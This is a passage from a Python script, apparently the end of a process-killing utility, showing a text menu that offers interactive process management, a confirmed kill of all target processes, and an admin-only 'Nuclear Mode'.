    killer = ProcessKiller()
    
    while True:
        print("=" * 60)
        print("🎯 MAIN MENU")
        print("=" * 60)
        print("1. Interactive Process Manager")
        print("2. Quick Kill All Target Processes")
        print("3. Nuclear Mode (EXTREME - Admin Required)")
        print("0. Exit")
        
        choice = input("\nSelect option: ").strip()
        
        if choice == "1":
            killer.interactive_process_selection()
            
        elif choice == "2":
            confirm = input("Kill all target processes? (y/N): ").strip().lower()
            if confirm in ['y', 'yes']:
                killer.kill_all_targets()
                input("\nPress Enter to continue...")
            
        elif choice == "3":
            killer.extreme_kill_mode()
            
        elif choice == "0":
            print("👋 Goodbye!")
            break
            
        else:
            print("❌ Invalid option!")

if __name__ == "__main__":
    main()